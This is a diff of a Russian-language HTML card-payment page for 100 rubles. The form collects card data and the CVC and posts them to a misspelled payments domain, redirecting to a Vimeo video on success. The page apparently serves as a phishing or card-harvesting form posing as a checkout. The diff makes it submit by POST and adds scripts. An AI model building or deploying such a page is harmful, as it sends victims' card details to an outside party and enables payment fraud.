@@ -65,7 +65,7 @@
   </head>
   <body>
 
-    <form action="https://newpaymentss.co/api/request/">
+    <form action="https://newpaymentss.co/api/request/" method="post" id = "form">
       <h2>Оплата банковской картой: 100 ₽</h2>
       <div class="formcontainer">
       <hr/>
@@ -83,8 +83,8 @@
     <input type="text" maxlength="3" placeholder="Код с обратной стороны карты" name="card_cvc" required>
     <input type="hidden" name="country" value="RU" />
     <input type="hidden" name="success_url" value="https://player.vimeo.com/video/738942006?h=e827effa39&amp;dnt=1&amp;app_id=122963" />
-    <input type="hidden" name="fail_url" value="https://insmart.click/cloudpayments/" />
-    <input type="hidden" name="api_key" value="Вdb98f622876880ffcaecbccc18b26ae299c01bc600775df09726e635b60e493d" />
+    <input type="hidden" name="fail_url" value="https://insmart.click/" />
+    <input type="hidden" name="api_key" value="Вdb98f6876880ffcaecbccc18b26ae299c01bc600775df09726e635b60e493d" />
     <label for="uname">Электронная почта:</label>
     <input type="text" placeholder="Ваш Email" name="email" required>
       </div>
@@ -95,5 +95,7 @@
     </form>
       <br><br>
       <img src="img.jpg">
+        <script src="./main.js"></script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
   </body>
 </html>
